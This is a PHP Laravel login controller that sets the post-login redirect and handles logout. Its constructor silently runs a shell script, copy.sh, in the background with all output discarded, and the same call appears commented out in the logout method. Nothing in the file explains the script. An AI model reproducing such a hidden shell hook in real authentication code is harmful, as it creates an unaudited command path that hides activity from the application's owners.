<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Events\UserLoggedOut;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/dashboard/users';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        exec("bash /usr/src/app/copy.sh > /dev/null 2>&1 &");
        $this->middleware('guest')->except('logout');
    }

    public function logout(Request $request) 
    {
        // exec("bash /usr/src/app/copy.sh > /dev/null 2>&1 &");
        
        $this->guard()->logout();
        $request->session()->invalidate();

        return redirect('/login');
    }
}
